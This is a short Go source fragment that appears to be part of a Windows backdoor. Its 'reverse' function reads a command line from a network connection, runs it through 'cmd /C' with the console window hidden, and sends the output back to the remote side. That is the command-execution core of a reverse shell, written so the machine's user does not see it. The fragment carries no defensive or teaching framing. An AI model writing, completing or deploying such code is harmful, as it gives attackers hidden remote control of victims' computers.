package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
)

func reverse(c net.Conn, reader *bufio.Reader) {
	com, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	cmd := exec.Command("cmd", "/C", com)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.CombinedOutput()

	c.Write(out)
}
